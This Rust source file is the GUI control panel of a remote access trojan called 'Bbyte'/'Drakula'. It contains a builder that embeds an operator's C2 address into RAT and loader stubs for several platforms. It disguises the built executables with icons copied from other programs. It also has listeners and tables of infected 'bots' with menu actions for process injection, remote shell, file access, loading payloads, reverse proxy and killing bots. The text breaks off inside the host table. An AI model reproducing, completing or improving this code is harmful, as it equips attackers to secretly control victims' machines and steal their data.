// #![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
// #![windows_subsystem = "windows"]
use controller::*;
use eframe::egui::{self};
use egui_extras::{Size, StripBuilder, TableBuilder};
use BByte_util::{ftp::method::transfer_speed, gen::replace_connection_info_to_new_file, *};
use egui::{Color32, Context, Stroke, Ui, Vec2, Painter,};
use std::ffi::OsString;
use egui::{Button, Rect, pos2, vec2, Window,TextureId,TextureHandle};
use image::io::Reader as ImageReader;
use egui_extras::RetainedImage;
use rand::Rng;
use tokio::runtime::Runtime;
use windows_icons::{
    get_icon_base64_by_path, get_icon_base64_by_process_id, get_icon_by_path,
    get_icon_by_process_id,                                           
};

mod controller;
mod msgbox;

#[cfg_attr(feature = "serde", derive(serde::Deserialize, serde::Serialize))]
#[derive(Clone, Copy, Debug, PartialEq)]
enum SwitchDock {
    Hosts,
    Loader,
    Listener,
    Generator,
}

#[derive(PartialEq)]
pub enum DrakulaBuild {
    Loader,
    Rat,
    Unknow,
}
impl std::fmt::Debug for DrakulaBuild {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Loader => write!(f, "Loader Stub"),
            Self::Rat => write!(f, "Rat Stub"),
            Self::Unknow => write!(f, ""),
            // Self::DARWINX64 => write!(f, "OSX_x86_64"),
        }
    }
}

#[derive(PartialEq)]
enum DrakulaPlatform {
    LinuxX64,
    WindowsX64,
    BSDX64,
    DARWINX64,
}

impl std::fmt::Debug for DrakulaPlatform {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::LinuxX64 => write!(f, "Linux_x86_64"),
            Self::WindowsX64 => write!(f, "Windows_x86_64"),
            Self::BSDX64 => write!(f, "BSD_x86_64"),
            Self::DARWINX64 => write!(f, "OSX_x86_64"),
        }
    }
}

fn doc_link_label<'a>(title: &'a str, search_term: &'a str) -> impl egui::Widget + 'a {
    let label = format!("{}:", title);
    let url = String::new();
    move |ui: &mut egui::Ui| {
        ui.hyperlink_to(label, url).on_hover_ui(|ui| {
            ui.horizontal_wrapped(|ui| {
                ui.label("");
                ui.code(search_term);
            });
        })
    }
}
struct MyApp {
    select_icon: bool,  
    selected_file: Option<String>,   
    icon_texture_id: Option<TextureId>,    
    texture_id: Option<egui::TextureId>,
    current_icon: Option<RetainedImage>,

}

impl MyApp {
    fn new(ctx: &egui::Context) -> Self {
        let initial_image = RetainedImage::from_image_bytes(
            "initial.ico",
            include_bytes!("res/native.ico"), // Замените на путь к вашему изображению
        )
        .unwrap();
        let texture_id = initial_image.texture_id(ctx);

        Self {
            texture_id: Some(texture_id),
            // current_image: initial_image,
            select_icon: false,
            selected_file: None,
            icon_texture_id: None,
            current_icon: Some(initial_image),
        }
    }
    fn render(&mut self, ui: &mut egui::Ui, ctx: &egui::Context) {
        ui.horizontal(|row| {
            // Отображаем текущую иконку
            if let Some(texture_id) = &self.texture_id {
                row.add(egui::Image::new(*texture_id, Vec2::new(30.0, 30.0)));
            }

            // Кнопка для изменения иконки
            if row.button("Change Image").clicked() {
                // Путь к новому изображению (замените на ваш путь)


                let path = std::env::current_dir().unwrap();
                if let Some(file_path) = rfd::FileDialog::new()
                    .set_directory(&path)
                    .pick_file()
                {

                self.select_icon = true;
                let random_number: u32 = rand::thread_rng().gen_range(10000000..100000000);
                let curr_dir = std::env::current_dir().expect("Failed to get current directory");
                let temp_dir_filename = format!(
                    "{}/temp/{}.ico",
                    curr_dir.to_str().expect("Failed to convert path to string"),
                    random_number
                );



             
                let current_dir = std::env::current_dir().expect("error");

                let current_dir_str = current_dir.to_str().expect("error none");
                let resource_hacker_path_lib = current_dir_str.to_string() + "\\libs\\resources.res";
 
                let file_path_clone = file_path.clone(); 

              let th1 =  thread::spawn(move || {
                    
                 
                match  Self::extract_exe_resource(&file_path.to_str().unwrap()) {
                    Ok(()) => {
                        println!("Иконка успешно изменена для файла {}", &file_path.to_str().unwrap());
                    }
                    Err(err) => {
                        println!("Ошибка: {}", err); // Выводим ошибку, если она возникла
                    }
                }
              });

              th1.join().expect("err th1");
            
                let icon = get_icon_by_path(&file_path_clone.to_str().unwrap());
                icon.save(&temp_dir_filename).unwrap();

                if let Ok(file_bytes) = Self::load_image_from_file(&temp_dir_filename) {
                    // Создаем RetainedImage из байтов файла
                    match RetainedImage::from_image_bytes(&temp_dir_filename, &file_bytes) {
                        Ok(new_icon) => {
                            
                            let texture_id = new_icon.texture_id(ctx);
                            

                            self.current_icon = Some(new_icon);
                            

                            self.texture_id = Some(texture_id);
                        }
                        Err(err) => {
                            eprintln!("Failed to create RetainedImage: {}", err);
                            // msgbox::error("Error", "Failed to create image from bytes.");
                        }
                    }
                } else {
                    eprintln!("Failed to load image from file: {}", temp_dir_filename);
                    // msgbox::error("Error", "Failed to load image from file.");
                }



            }
            }


        });
    }
    fn extract_exe_resource(source_exe: &str,) -> Result<(), String> {
        let current_dir = std::env::current_dir().expect("error");
        let current_dir_str = current_dir.to_str().expect("error none");
        let resource_hacker_path = current_dir_str.to_string() + "\\libs\\ResourceHacker.exe";
        let resource_hacker_path_os: OsString = resource_hacker_path.into();
        let resource_hacker_path_lib = current_dir_str.to_string() + "\\libs\\resources.res";
        let extract_status = std::process::Command::new(resource_hacker_path_os)
        .args(&[
            "-open", source_exe,
            "-save", &resource_hacker_path_lib,
            "-action", "extract",
            "-musk","STRING TABLE, ICON, BITMAP, MENU, DIALOG, CURSOR, ACCELERATOR, RCDATA, MISC, FONT, FONT DIR, VERSION, DLGINCLUDE, TEXTOBJ, JPEG, PNG, GIF, AVI, WAVE"
        ])
        .status()
        .expect("Failed to apply resources");

        if !extract_status.success() {
            eprintln!("Failed to extract resources.");
            return Err("Failed to extract resources.".to_string());
        }
    
        Ok(())
    }
    fn load_image_from_file(file_path: &str) -> Result<Vec<u8>, std::io::Error> {
        std::fs::read(file_path)
    }
}
 
use std::thread;
use std::time::Duration;
use reqwest::blocking::get;
use serde_json::Value;
use std::time::{SystemTime, UNIX_EPOCH};

fn get_current_unix_time() -> Result<u64, Box<dyn std::error::Error>> {
    let now = SystemTime::now();

    // Преобразуем в timestamp (количество секунд с Unix-эпохи)
    let timestamp = now.duration_since(UNIX_EPOCH)
        .expect("Ошибка: время до Unix-эпохи!")
        .as_secs();
    Ok(timestamp)
}
fn start_time_check_thread(expiration_unix_time: u64) {
    thread::spawn(move || {
        loop {
            match get_current_unix_time() {
                Ok(current_unix_time) => {
                    if current_unix_time >= expiration_unix_time {
                  
                        std::process::exit(0);
                    }

                    let remaining_time = expiration_unix_time - current_unix_time;
                   
                }
                Err(e) => {
                    
                }
            }
            thread::sleep(Duration::from_secs(30));
        }
    });
}


use std::collections::HashMap;

use tokio::sync::mpsc;
use tokio::task;
use tokio::time::{sleep};
use std::sync::Arc;
use tokio::sync::Mutex;
mod rprox;
use lazy_static::lazy_static;
// use rprox;
lazy_static! {
    static ref STOP_RX: Arc<Mutex<mpsc::Receiver<()>>> = {
        let (stop_tx, stop_rx) = mpsc::channel(32);
        // Сохраняем stop_tx в STOP_TX
        STOP_TX.set(stop_tx).unwrap();
        Arc::new(Mutex::new(stop_rx))
    };
    static ref STOP_TX: tokio::sync::OnceCell<mpsc::Sender<()>> = tokio::sync::OnceCell::new();
}

// #[tokio::main]
  fn main() {


    // let initial_unix_time = 1740379301;

    // let three_days_in_seconds = 50*24*60*60; 
    // let expiration_unix_time = initial_unix_time + three_days_in_seconds;

     
    // start_time_check_thread(expiration_unix_time);
    #[cfg(debug_assertions)]
    {
        simple_logger::SimpleLogger::new()
            .with_threads(true)
            .with_utc_timestamps()
            .with_colors(true)
            .init()
            .unwrap();
        ::log::set_max_level(log::LevelFilter::Debug);
    }
    let mut options = eframe::NativeOptions::default();
    options.initial_window_size = Some(egui::Vec2::new(1535.0, 610.0));
    options.renderer = eframe::Renderer::Glow;
    eframe::run_native(
        "Bbyte",
        options,
        Box::new(|_cc| Box::new(DrakulaApp::default())),
    );
}
struct DrakulaApp {
    my_app: Option<MyApp>, 
    initilized: bool,
    proxy_running: HashMap<String, bool>,  
    switch: SwitchDock,
    resizable: bool,
    text_listen_port: String,
    combox_listen_protocol: DrakulaProtocol,
    text_generator_port: String,
    text_generator_address: String,
    text_generator_remark: String,
    combox_generator_build: DrakulaBuild,
    combox_generator_protocol: DrakulaProtocol,
    combox_generator_platform: DrakulaPlatform,
    host_image: egui_extras::RetainedImage,
    host_image_load: egui_extras::RetainedImage,
    listener_image: egui_extras::RetainedImage,
}

impl Default for DrakulaApp {
    fn default() -> Self {
        Self {
            my_app: None,
            initilized: false,
            switch: SwitchDock::Hosts,
            resizable: true,
            proxy_running: HashMap::new(),
            text_listen_port: String::new(),
            combox_listen_protocol: DrakulaProtocol::TCP,
            text_generator_port: String::new(),
            text_generator_address: String::new(),
            text_generator_remark: String::new(),
            combox_generator_build: DrakulaBuild::Unknow,
            combox_generator_protocol: DrakulaProtocol::TCP,
            combox_generator_platform: DrakulaPlatform::WindowsX64,
            host_image: egui_extras::RetainedImage::from_image_bytes(
                "rat.png",
                include_bytes!("res/host.png"),
            )
            .unwrap(),
            host_image_load: egui_extras::RetainedImage::from_image_bytes(
                "hostLoad.ico",
                include_bytes!("res/hostLoad.png"),
            )
            .unwrap(),
            listener_image: egui_extras::RetainedImage::from_image_bytes(
                "listen.ico",
                include_bytes!("res/listen.ico"),
            )
            .unwrap(),
        }
    }
    
}

impl eframe::App for DrakulaApp {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        egui::CentralPanel::default().show(ctx, |ui| {
            if !self.initilized {
                ui.ctx().set_visuals(egui::Visuals::dark());
                self.initilized = true;
                let handle = thread::spawn(|| {
                    listen_auto_conected();
                });
                handle.join().unwrap(); 
            }

            self.ui(ctx, ui);
            ctx.request_repaint();
        });
    }
}
impl DrakulaApp {
    fn ui(&mut self, ctx: &egui::Context, ui: &mut egui::Ui) {

        if self.my_app.is_none() {
            self.my_app = Some(MyApp::new(ctx));
        }
    
        ui.horizontal(|ui| {
            ui.selectable_value(&mut self.switch, SwitchDock::Hosts, "RAT_BOTS");
            ui.selectable_value(&mut self.switch, SwitchDock::Loader, "LOADER_BOTS");
            ui.selectable_value(&mut self.switch, SwitchDock::Listener, "Listener");
            ui.selectable_value(&mut self.switch, SwitchDock::Generator, "Builder");

            let visuals = ui.ctx().style().visuals.clone();
            match visuals.light_dark_small_toggle_button(ui) {
                Some(v) => ui.ctx().set_visuals(v),
                None => {}
            };
        });

        ui.separator();

        match self.switch {
            SwitchDock::Hosts => {
                StripBuilder::new(ui)
                    .size(Size::remainder())
                    .size(Size::exact(15.0))
                    .vertical(|mut strip| {
                        strip.cell(|ui| {
                            ui.vertical_centered(|ui| {
                                self.host_table(ctx, ui);
                            });
                        });
                        strip.cell(|ui| {
                            ui.vertical_centered(|ui| {
                                // ui.hyperlink_to("(Loader By Adderall)", "https://t.me/Add3rol")
                            });
                        });
                    });
            }
            SwitchDock::Loader => {
                StripBuilder::new(ui)
                    .size(Size::remainder())
                    .size(Size::exact(15.0))
                    .vertical(|mut strip| {
                        strip.cell(|ui| {
                            ui.vertical_centered(|ui| {
                                self.loader_table(ctx, ui);
                            });
                        });
                        strip.cell(|ui| {
                            ui.vertical_centered(|ui| {
                                // ui.hyperlink_to("(Loader By Adderall)", "https://t.me/Add3rol")
                            });
                        });
                    });
            }
            SwitchDock::Listener => {
                StripBuilder::new(ui)
                    .size(Size::exact(20.0))
                    .size(Size::exact(5.0))
                    .size(Size::remainder())
                    .size(Size::exact(15.0))
                    .vertical(|mut strip| {
                        strip.strip(|builder| {
                            builder
                                .size(Size::exact(70.0))
                                .size(Size::exact(120.0))
                                .size(Size::exact(50.0))
                                .size(Size::remainder())
                                .size(Size::exact(100.0))
                                .horizontal(|mut strip| {
                                    strip.cell(|ui| {
                                        ui.label("Protocol : ");
                                    });
                                    strip.cell(|ui| {
                                        egui::ComboBox::from_label("")
                                            .selected_text(format!(
                                                "{:?}",
                                                self.combox_listen_protocol
                                            ))
                                            .show_ui(ui, |ui| {
                                                ui.selectable_value(
                                                    &mut self.combox_listen_protocol,
                                                    DrakulaProtocol::TCP,
                                                    "TCP",
                                                );
                                                ui.selectable_value(
                                                    &mut self.combox_listen_protocol,
                                                    DrakulaProtocol::HTTP,
                                                    "HTTP",
                                                );
                                                ui.selectable_value(
                                                    &mut self.combox_listen_protocol,
                                                    DrakulaProtocol::UDP,
                                                    "UDP",
                                                );
                                            });
                                    });
                                    strip.cell(|ui| {
                                        ui.label("Port : ");
                                    });
                                    strip.cell(|ui| {
                                        ui.add(
                                            egui::TextEdit::singleline(&mut self.text_listen_port)
                                                .hint_text("9001"),
                                        );
                                    });
                                    strip.cell(|ui| {
                                        if ui.button("Add a Listener").clicked() {
                                            match self.text_listen_port.parse::<u16>() {
                                                Ok(port) => {
                                                    match add_listener(
                                                        &self.combox_listen_protocol,
                                                        port,
                                                        false
                                                    ) {
                                                        Ok(_) => {}
                                                        Err(e) => {
                                                            msgbox::error(
                                                                &"Listener".to_string(),
                                                                &format!("{}", e),
                                                            );
                                                        }
                                                    };
                                                }
                                                Err(e) => {
                                                    msgbox::error(
                                                        &"Listener".to_string(),
                                                        &format!("{}", e),
                                                    );
                                                }
                                            };
                                        };
                                    });
                                });
                        });
                        strip.cell(|ui| {
                            ui.separator();
                        });
                        strip.cell(|ui| {
                            self.listen_table(ctx, ui);
                        });
                        strip.cell(|ui| {
                            ui.vertical_centered(|ui| {

 
                                // ui.hyperlink_to("(Loader By Adderall)", "https://t.me/Add3rol")
                            });
                        });
                    });
            }
            SwitchDock::Generator => {
                StripBuilder::new(ui)
                    .size(Size::remainder())
                    .size(Size::exact(15.0))
                    .vertical(|mut strip| {
                        strip.cell(|ui| {
                            egui::Grid::new("my_grid")
                                .num_columns(2)
                                .spacing([300.0, 10.0])
                                .striped(true)
                                .show(ui, |ui| {


                                    ui.add(doc_link_label("Select Payload", "label,heading"));
                                    egui::ComboBox::from_id_source(3)
                                        .selected_text(format!(
                                            "{:?}",
                                            self.combox_generator_build
                                        ))
                                        .width(280.0)
                                        .show_ui(ui, |ui| {
                                            ui.selectable_value(
                                                &mut self.combox_generator_build,
                                                DrakulaBuild::Unknow,
                                                format!("{:?}", DrakulaBuild::Unknow),
                                            );
                                            ui.selectable_value(
                                                &mut self.combox_generator_build,
                                                DrakulaBuild::Rat,
                                                format!("{:?}", DrakulaBuild::Rat),
                                            );
                                            ui.selectable_value(
                                                &mut self.combox_generator_build,
                                                DrakulaBuild::Loader,
                                                format!("{:?}", DrakulaBuild::Loader),
                                            );
                                          
                                        });
                                    ui.end_row();

                                    let is_disabled = self.combox_generator_build == DrakulaBuild::Unknow;


                                    ui.add(doc_link_label("Address", "label,heading"));
                                    ui.add_enabled(!is_disabled,
                                        egui::TextEdit::singleline(
                                            &mut self.text_generator_address,
                                        )
                                        .hint_text("127.0.0.1"),
                                    );
                                    ui.end_row();

                                    ui.add(doc_link_label("Port", "label,heading"));
                                    ui.add_enabled(!is_disabled,
                                        egui::TextEdit::singleline(&mut self.text_generator_port)
                                            .hint_text("9001"),
                                    );
                                    ui.end_row();

                                    ui.add(doc_link_label("Protocol", "label,heading"));
                                    egui::ComboBox::from_id_source(1)
                                        .selected_text(format!(
                                            "{:?}",
                                            self.combox_generator_protocol
                                        ))
                                        .width(280.0)
                                        .show_ui(ui, |ui| {
                                            ui.set_enabled(!is_disabled);
                                            ui.selectable_value(
                                                &mut self.combox_generator_protocol,
                                                DrakulaProtocol::TCP,
                                                format!("{:?}", DrakulaProtocol::TCP),
                                            );
                                            ui.selectable_value(
                                                &mut self.combox_generator_protocol,
                                                DrakulaProtocol::HTTP,
                                                format!("{:?}", DrakulaProtocol::HTTP),
                                            );
                                            ui.selectable_value(
                                                &mut self.combox_generator_protocol,
                                                DrakulaProtocol::UDP,
                                                format!("{:?}", DrakulaProtocol::UDP),
                                            );
                                        });
                                    ui.end_row();

                                    ui.add(doc_link_label("Platform", "label,heading"));
                                    egui::ComboBox::from_id_source(2)
                                        .width(280.0)
                                        .selected_text(format!(
                                            "{:?}",
                                            self.combox_generator_platform
                                        ))
                                        .show_ui(ui, |ui| {
                                            ui.set_enabled(!is_disabled);
                                            ui.selectable_value(
                                                &mut self.combox_generator_platform,
                                                DrakulaPlatform::WindowsX64,
                                                format!("{:?}", DrakulaPlatform::WindowsX64),
                                            );
                                            ui.selectable_value(
                                                &mut self.combox_generator_platform,
                                                DrakulaPlatform::LinuxX64,
                                                format!("{:?}", DrakulaPlatform::LinuxX64),
                                            );
                                            ui.selectable_value(
                                                &mut self.combox_generator_platform,
                                                DrakulaPlatform::BSDX64,
                                                format!("{:?}", DrakulaPlatform::BSDX64),
                                            );
                                            ui.selectable_value(
                                                &mut self.combox_generator_platform,
                                                DrakulaPlatform::DARWINX64,
                                                format!("{:?}", DrakulaPlatform::DARWINX64),
                                            );
                                        });
                                    ui.end_row();

                                    ui.add(doc_link_label("Group", "label,heading"));
                                    ui.add_enabled(!is_disabled,
                                        egui::TextEdit::singleline(&mut self.text_generator_remark)
                                            .hint_text("default"),
                                    );
                                    ui.end_row();
                                });
                            ui.separator();
                            let is_disabled = self.combox_generator_build == DrakulaBuild::Unknow;
                            let is_selected_rat = self.combox_generator_build == DrakulaBuild::Rat;
                            StripBuilder::new(ui)
                                .size(Size::exact(570.0))
                                .size(Size::exact(60.0))
                                .horizontal(|mut strip| {
                                    strip.cell(|_ui| {});
                                    strip.cell(|ui| {
                                        ui.set_enabled(!is_disabled);
                                        if ui.button("Building").clicked() {
                                            let path = std::env::current_dir().unwrap();

                                            let res = match rfd::FileDialog::new()
                                                .set_directory(&path)
                                                .save_file()
                                            {
                                                Some(p) => p,
                                                None => return,
                                            };

                                            let new_path = res.to_str().unwrap().to_string();

                                            let mut slave_file_path = "v".to_string();
                                            if !is_disabled && is_selected_rat {
                                             slave_file_path =
                                                match self.combox_generator_platform {
                                                    DrakulaPlatform::LinuxX64 => path
                                                        .join("BByte_client_linux")
                                                        .to_str()
                                                        .unwrap()
                                                        .to_string(),
                                                    DrakulaPlatform::WindowsX64 => path
                                                        .join("libs\\Resource_client.bin")
                                                        .to_str()
                                                        .unwrap()
                                                        .to_string(),
                                                    DrakulaPlatform::BSDX64 => path
                                                        .join("BByte_client_bsd")
                                                        .to_str()
                                                        .unwrap()
                                                        .to_string(),
                                                    DrakulaPlatform::DARWINX64 => path
                                                        .join("BByte_client_darwin")
                                                        .to_str()
                                                        .unwrap()
                                                        .to_string(),
                                                };
                                            }
                                            else {
                                                slave_file_path =
                                                match self.combox_generator_platform {
                                                    DrakulaPlatform::LinuxX64 => path
                                                        .join("BByte_client_linux")
                                                        .to_str()
                                                        .unwrap()
                                                        .to_string(),
                                                    DrakulaPlatform::WindowsX64 => path
                                                        .join("libs\\Resource_client_loader.bin")
                                                        .to_str()
                                                        .unwrap()
                                                        .to_string(),
                                                    DrakulaPlatform::BSDX64 => path
                                                        .join("BByte_client_bsd")
                                                        .to_str()
                                                        .unwrap()
                                                        .to_string(),
                                                    DrakulaPlatform::DARWINX64 => path
                                                        .join("BByte_client_darwin")
                                                        .to_str()
                                                        .unwrap()
                                                        .to_string(),
                                                };
                                                
                                            }
                                                



                                            match replace_connection_info_to_new_file(
                                                &slave_file_path,
                                                &new_path,
                                                ConnectionInfo {
                                                    protocol: self
                                                        .combox_generator_protocol
                                                        .to_u8(),
                                                    address: format!(
                                                        "{}:{}",
                                                        self.text_generator_address,
                                                        self.text_generator_port
                                                    ),
                                                    remark: self.text_generator_remark.clone(),
                                                },
                                            ) {
                                                Ok(_) => {
                                                    msgbox::info(
                                                        &"Builder".to_string(),
                                                        &"Success!".to_string(),
                                                    );
                                                }
                                                Err(e) => {
                                                    msgbox::error(
                                                        &"Bulder".to_string(),
                                                        &format!("{}", e),
                                                    );
                                                }
                                            }
                                         
                                            if let Some(my_app) = &mut self.my_app {
                                                let new_path_clone = new_path.to_string();
                                                let select_icon = my_app.select_icon;
                                            
                                               
                                                let handle = thread::spawn(move || {
                                                     
                                                    // msgbox::info(&"good".to_string(), &"good".to_string());
                                                   
                                                    if select_icon {
                                                     
                                                        match modify_exe_icon(new_path_clone.as_str(), new_path_clone.as_str()) {
                                                            Ok(()) => {
                                                                println!("Иконка успешно изменена для файла {}", new_path_clone);
                                                            }
                                                            Err(err) => {
                                                                msgbox::error(&"Builder".to_string(), &format!("{}", err));
                                                                println!("Ошибка: {}", err);
                                                            }
                                                        }
                                                    } else {
                                                        // Другая логика, если иконка не выбрана
                                                    }
                                                });
                                            
                                                // Дождитесь завершения потока, если это необходимо
                                                handle.join().unwrap();
                                            } else {
                                                // Логика, если `my_app` отсутствует
                                            }
     
                                            } else {
                                               
                                            }
                                       
                                    });
                                });
                        });

                        strip.cell(|ui| {
                            ui.vertical_centered(|ui| {
                                // ui.hyperlink_to("(Bulder By Adderall)", "https://t.me/Add3rol")
                            });
                        });
                    });
                    if let Some(my_app) = &mut self.my_app {
                        let rect = egui::Rect::from_min_size(
                            egui::pos2(820.0, 65.0), 
                            egui::vec2(75.0, 75.0), 
                        );
            
                        ui.allocate_ui_at_rect(rect, |ui| {
                            my_app.render(ui, ctx);
                        });
                    }
                    fn modify_exe_icon(target_exe: &str, output_exe: &str) -> Result<(), String> {
                        let current_dir = std::env::current_dir().expect("error");
                        let current_dir_str = current_dir.to_str().expect("error none");
                        let resource_hacker_path = current_dir_str.to_string() + "\\libs\\ResourceHacker.exe";
                        let resource_hacker_path_os: OsString = resource_hacker_path.into();
                        let resource_hacker_path_lib = current_dir_str.to_string() + "\\libs\\resources.res";
                        let apply_status = std::process::Command::new(resource_hacker_path_os)
                        .args(&[
                            "-open", target_exe,
                            "-save", output_exe,
                            "-action", "addoverwrite",
                            "-res", &resource_hacker_path_lib,
                        ])
                        .status()
                        .expect("Failed to apply resources");
                
                        if apply_status.success() {
                        println!("Resources successfully applied to {}", output_exe);
                        } else {
                        eprintln!("Failed to apply resources.");
                        }
                    
                        Ok(())
                    }
            }
        }
    }

    fn listen_table(&mut self, ctx: &egui::Context, ui: &mut egui::Ui) {
        TableBuilder::new(ui)
            .striped(true)
            .cell_layout(egui::Layout::left_to_right(egui::Align::Center))
            .column(Size::initial(320.0).at_least(50.0))
            .column(Size::initial(320.0).at_least(50.0))
            .column(Size::initial(135.0).at_least(50.0))
            .column(Size::initial(488.0).at_least(50.0))
            .column(Size::initial(200.0).at_least(50.0))
            .resizable(self.resizable)
            .header(20.0, |mut header| {
                header.col(|ui| {
                    ui.heading("");
                });
                header.col(|ui| {
                    ui.heading("Protocol");
                });
                header.col(|ui| {
                    ui.heading("Port");
                });
                header.col(|ui| {
                    ui.heading("Status");
                });
                header.col(|ui| {
                    ui.heading("");
                });
            })
            .body(|mut body| {
                for listener in all_listener() {
                    let row_height = 30.0;
                    body.row(row_height, |mut row| {
                        row.col(|ui| {
                            ui.add(egui::Image::new(
                                self.listener_image.texture_id(ctx),
                                egui::Vec2::new(30.0, 30.0),
                            ));
                        });

                        row.col(|ui| {
                            ui.label(format!("{:?}", listener.protocol));
                        });
                        row.col(|ui| {
                            ui.label(format!("{}", listener.addr.port()));
                        });

                        row.col(|ui| {
                            ui.label("Running");
                        });

                        row.col(|ui| {
                            if ui.button("Remove").clicked() {
                                match remove_listener(listener.id,listener.addr.port().to_string()) {
                                    Ok(_) => {}
                                    Err(e) => {
                                      
                                    }
                                };
                            };
                        });
                    });
                }
            });
    }
    fn loader_table(&mut self, ctx: &egui::Context, ui: &mut egui::Ui) {
        TableBuilder::new(ui)
            .striped(true)
            .cell_layout(egui::Layout::left_to_right(egui::Align::Center))
            .column(Size::initial(50.0).at_least(50.0))
            .column(Size::initial(160.0).at_least(50.0))
            .column(Size::initial(110.0).at_least(50.0))
            .column(Size::initial(150.0).at_least(50.0))
            .column(Size::initial(210.0).at_least(50.0))
            .column(Size::initial(100.0).at_least(50.0))
            .column(Size::initial(100.0).at_least(50.0))
            .column(Size::initial(100.0).at_least(50.0))
            .column(Size::initial(255.0).at_least(50.0))
            .column(Size::initial(230.0).at_least(50.0))
            .resizable(self.resizable)
            .header(20.0, |mut header| {
                header.col(|ui| {
                    ui.heading("");
                });
                header.col(|ui| {
                    ui.heading("IP");
                });
                header.col(|ui| {
                    ui.heading("Name PC");
                });
                header.col(|ui| {
                    ui.heading("Host Name");
                });
                header.col(|ui| {
                    ui.heading("OS");
                });
                header.col(|ui| {
                    ui.heading("Protocol");
                });
                header.col(|ui| {
                    ui.heading("Incoming");
                });
                header.col(|ui| {
                    ui.heading("Outgoing");
                });
                header.col(|ui| {
                    ui.heading("Last Connect");
                });
                header.col(|ui| {
                    ui.heading("Group Name");
                });
            })
            .body(|mut body| {
                for info in all_host_loader() {
                    let clientid = info.clientid.clone();

                    let menu = |ui: &mut egui::Ui| {
                        if ui.button("Loader").clicked() {
                            match open_loader(&clientid) {
                                Ok(_) => {}
                                Err(e) => {
                                    msgbox::error(&"Shell".to_string(), &format!("{}", e));
                                }
                            };
                            ui.close_menu();
                        }
                        if ui.button("KillBot").clicked() {
                            match open_kill(&clientid) {
                                Ok(_) => {
                                    remove_host(clientid.to_string());
                                }
                                Err(e) => {
                                    msgbox::error(&"KILL".to_string(), &format!("{}", e));
                                }
                            };
 
                            ui.close_menu();
                        }

                    };

                    let row_height = 50.0;
                    body.row(row_height, |mut row| {
                        row.col(|ui| {
                            ui.add(egui::Image::new(
                                self.host_image_load.texture_id(ctx),
                                egui::Vec2::new(50.0, 50.0),
                            ));
                        })
                        .context_menu(menu);

                        row.col(|ui| {
                            ui.label(format!("{}", info.peer_addr));
                        })
                        .context_menu(menu);

                        row.col(|ui| {
                            ui.label(info.info.whoami);
                        })
                        .context_menu(menu);
                        row.col(|ui| {
                            ui.label(info.info.host_name);
                        })
                        .context_menu(menu);
                        row.col(|ui| {
                            ui.label(info.info.os);
                        })
                        .context_menu(menu);
                        row.col(|ui| {
                            ui.label(format!("{:?}", info.proto));
                        })
                        .context_menu(menu);

                        row.col(|ui| {
                            let secs = cur_timestamp_secs() - info.last_heartbeat;
                            let in_rate = info.in_rate / (secs + HEART_BEAT_TIME);
                            ui.label(transfer_speed(in_rate as f64));
                        })
                        .context_menu(menu);

                        row.col(|ui| {
                            let secs = cur_timestamp_secs() - info.last_heartbeat;
                            let out_rate = info.out_rate / (secs + HEART_BEAT_TIME);
                            ui.label(transfer_speed(out_rate as f64));
                        })
                        .context_menu(menu);

                        row.col(|ui| {
                            let secs = cur_timestamp_secs() - info.last_heartbeat;
                            if secs > 30 {
                                remove_host(info.clientid);
                            }
                            ui.label(format!("{} s", secs));
                        })
                        .context_menu(menu);
                        row.col(|ui| {
                            ui.label(info.info.remark);
                        })
                        .context_menu(menu);
                    });
                }
            });
    }
    fn host_table(&mut self, ctx: &egui::Context, ui: &mut egui::Ui) {
        TableBuilder::new(ui)
            .striped(true)
            .cell_layout(egui::Layout::left_to_right(egui::Align::Center))
            .column(Size::initial(50.0).at_least(50.0))
            .column(Size::initial(160.0).at_least(50.0))
            .column(Size::initial(110.0).at_least(50.0))
            .column(Size::initial(150.0).at_least(50.0))
            .column(Size::initial(210.0).at_least(50.0))
            .column(Size::initial(100.0).at_least(50.0))
            .column(Size::initial(100.0).at_least(50.0))
            .column(Size::initial(100.0).at_least(50.0))
            .column(Size::initial(150.0).at_least(50.0))
            .column(Size::initial(150.0).at_least(50.0))
            .column(Size::initial(150.0).at_least(50.0))
            .column(Size::initial(150.0).at_least(50.0))
            .column(Size::initial(150.0).at_least(50.0))
            .resizable(self.resizable)
            .header(20.0, |mut header| {
                header.col(|ui| {
                    ui.heading("");
                });
                header.col(|ui| {
                    ui.heading("IP");
                });
                header.col(|ui| {
                    ui.heading("Name PC");
                });
                header.col(|ui| {
                    ui.heading("Host Name");
                });
                header.col(|ui| {
                    ui.heading("OS");
                });
                header.col(|ui| {
                    ui.heading("Protocol");
                });
                header.col(|ui| {
                    ui.heading("Incoming");
                });
                header.col(|ui| {
                    ui.heading("Outgoing");
                });
                header.col(|ui| {
                    ui.heading("Last Connect");
                });
                header.col(|ui| {
                    ui.heading("Group Name");
                });
                header.col(|ui| {
                    ui.heading("Revers Proxy");
                });
            })
            .body(|mut body| {
                for info in all_host() {

                    // info.info.loader 
                    let clientid = info.clientid.clone();

                    let menu = |ui: &mut egui::Ui| {
                        if ui.button("Inject Process").clicked() {
                            match open_inject(&clientid) {
                                Ok(_) => {}
                                Err(e) => {
                                    msgbox::error(&"Shell".to_string(), &format!("{}", e));
                                }
                            };
                            ui.close_menu();
                        }
                        if ui.button("KillBot").clicked() {
                            match open_kill(&clientid) {
                                Ok(_) => {
                                    remove_host(clientid.to_string());
                                }
                                Err(e) => {
                                    msgbox::error(&"KILL".to_string(), &format!("{}", e));
                                }
                            };
 
                            ui.close_menu();
                        }
                        if ui.button("Shell").clicked() {
                            match open_shell(&clientid) {
                                Ok(_) => {}
                                Err(e) => {
                                    msgbox::error(&"Shell".to_string(), &format!("{}", e));
                                }
                            };
                            ui.close_menu();
                        }
                        if ui.button("File").clicked() {
                            match open_ftp(&clientid) {
                                Ok(_) => {}
                                Err(e) => {
                                    msgbox::error(&"Shell".to_string(), &format!("{}", e));
                                }
                            };
                            ui.close_menu();
                        }
                    };

                    let row_height = 50.0;
                    body.row(row_height, |mut row| {
                        row.col(|ui| {
                            ui.add(egui::Image::new(
                                self.host_image.texture_id(ctx),
                                egui::Vec2::new(50.0, 50.0),
                            ));
                        })
                        .context_menu(menu);

                        row.col(|ui| {
                            ui.label(format!("{}", info.peer_addr));
                        })
                        .context_menu(menu);

                        row.col(|ui| {
                            ui.label(info.info.whoami);
                        })
                        .context_menu(menu);
